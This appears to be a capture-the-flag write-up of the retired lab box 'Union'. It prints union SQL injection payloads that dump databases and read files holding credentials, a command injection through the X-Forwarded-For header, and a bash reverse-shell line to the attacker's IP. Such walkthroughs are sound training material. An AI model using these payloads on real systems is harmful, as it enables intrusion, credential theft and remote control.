# Union

This is the write-up for the box Union that got retired at the 23rd November 2021.
My IP address was 10.10.14.12 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.128    union.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/union.nmap 10.10.11.128
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web service hosts a custom developed website with the title _"Join the UHC - November Qualifiers"_ and there is an input field.
When typing anything into the field, it reveals a link to _challenge.php_ and on there it expects the _first flag_.

When sending a name of a real user of the **UHC November Qualifiers** like the creator of the box _ippsec_, then it shows a different message:
```
Sorry, ippsec you are not eligible due to already qualifying.
```

By testing for **SQL Injection** in this field, it can be proofed that it is possible as the comment is not displayed in the username:
```
POST /index.php HTTP/1.1
Host: 10.10.11.128
(...)

player=ippsec'-- -
```

Using **Union SQL Injection** to check number of fields:
```
player=ippsec' union select 1-- -

player=ippsec' union select 1,2-- -
```

The second query fails, so there seems to be only one field.
Getting information out of the _information_schema database_:
```
player=' union select group_concat(schema_name) from information_schema.schemata-- -
```
```
Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
```

It shows the names of the databases _mysql_, _information_schema_, _performance_schema_, _sys_, _november_ in the response output.

Getting table and column names from database _november_:
```
player=' union select group_concat(TABLE_NAME,':', COLUMN_NAME, "\n") from information_schema.columns where TABLE_SCHEMA like 'november'-- -
```
```
Sorry, flag:one
,players:player
 you are not eligible due to already qualifying.
```

Getting contents of the table _players_:
```
player=' union select group_concat(player, "\n") from november.players-- -
```
```
Sorry, ippsec
,celesian
,big0us
,luska
,tinyboy
you are not eligible due to already qualifying.
```

Getting contents of the table _flag_:
```
player=' union select group_concat(one, "\n") from november.flag-- -
```
```
Sorry, UHC{F1rst_5tep_2_Qualify}
you are not eligible due to already qualifying.
```

When sending the flag to _challenge.php_, it forwards to _firewall.php_ and shows a message, that our IP address has been granted SSH access:
```
Welcome Back!
Your IP Address has now been granted SSH Access.
```

The port 22 for SSH is now open and can be reached, but we have no credentials yet:
```
nc -zv 10.10.11.128 22

Ncat: Connected to 10.10.11.128:22.
```

The **SQL Injection** vulnerability can be used to read files from the file system.
The file _firewall.php_ requires _config.php_ and this file contains credentials:
```
player=' union select LOAD_FILE('/var/www/html/firewall.php')-- -

player=' union select LOAD_FILE('/var/www/html/config.php')-- -
```
```
(...)
$username = "uhc";
$password = "uhc-11qual-global-pw";
$dbname = "november";
```

With these credentials, it is possible to access the box via SSH:
```
ssh uhc@10.10.11.128
```

## Privilege Escalation

The file _/var/www/html/firewall.php_ has the code of the SSH enabling:
```php
(...)
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
(...)
```

It will send the variable _ip_ in the _X-FORWARDED-FOR_ header and it should be possible to inject commands:
```
GET /firewall.php HTTP/1.1
(...)
X-FORWARDED-FOR: ;sleep 3;
```

With the `sleep` command, it took three seconds until the response came back, so arbitrary command execution is proofed.
Sending a reverse shell command:
```
X-FORWARDED-FOR: ;bash -c 'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1';
```

After sending the request, the listener on my IP and port 9001 starts a reverse shell as _www-data_.

### Privilege Escalation to root

The `sudo` permissions of _www-data_ shows that the user can run any command as root:
```
User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
```

When running `sudo bash`, it will spawn a shell as root!
